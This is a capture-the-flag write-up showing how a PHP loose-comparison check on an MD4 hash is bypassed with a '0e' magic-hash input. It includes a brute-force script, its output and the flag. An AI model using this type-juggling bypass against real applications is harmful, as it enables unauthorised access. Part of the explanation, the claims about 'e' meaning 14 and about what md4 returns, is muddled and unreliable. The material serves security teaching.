## MD5--
### Category : Web

---
```
md5-- == md4

```

After visiting the given link, we get to see the source of `index.php` 

```
<?php
$flag = file_get_contents("/flag");

if (!isset($_GET["md4"]))
{
    highlight_file(__FILE__);
    die();
}

if ($_GET["md4"] == hash("md4", $_GET["md4"]))
{
    echo $flag;
}
else
{
    echo "bad";
}
?>
```

We need to find whose md4 hash "equals" the value of itself. Now since `==` is used instead of `===`, it's a loose comparison. In Loose comparison, whencomparing a string to a number, PHP will attempt to convert the string to a number then perform a numeric comparison. Sounds good, doesn't work. for example,  
```
0e12 == int(0) => True
```

`e` refers to an exponential in a decimal number, but also refers to `14`, when the string is supposed to be a hexadecimal number. Now, this is where we take advantage of the vulnerability. `md4(<some number>)`, will return a hexadecimal string, of the decimal value of `<some number>`. 
The easiest way to do this is to provide a number starting with 0e, which MD4 hash begins with 0e as well and contains only numbers.

A simple bruteforce does the trick.

`exploit.py`
```
import hashlib
import re

prefix = '0e'

def breakit():
    iters = 0
    while 1:
        s = prefix + str(iters)
        h = hashlib.new("md4")
        h.update(s.encode())
        hashed_s = h.hexdigest()
        iters = iters + 1
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            print ("[+] found! md4( {} ) ---> {}".format(s, hashed_s))
            print ("[+] in {} iterations".format(iters))
            exit(0)

        if iters % 1000000 == 0:
            print ("[+] current value: {}       {} iterations, continue...".format(s, iters))

breakit()
```

output
```
[+] current value: 0e999999       1000000 iterations, continue...
[+] current value: 0e1999999       2000000 iterations, continue...
[+] current value: 0e2999999       3000000 iterations, continue...
.
.
.
.
[+] current value: 0e249999999       250000000 iterations, continue...
[+] current value: 0e250999999       251000000 iterations, continue...
[+] found! md4( 0e251288019 ) ---> 0e874956163641961271069404332409
[+] in 251288020 iterations

```

Took roughly 5-7 mins to get the hash.
On inputting the value, we get the flag
```
FLAG : hsctf{php_type_juggling_is_fun}
```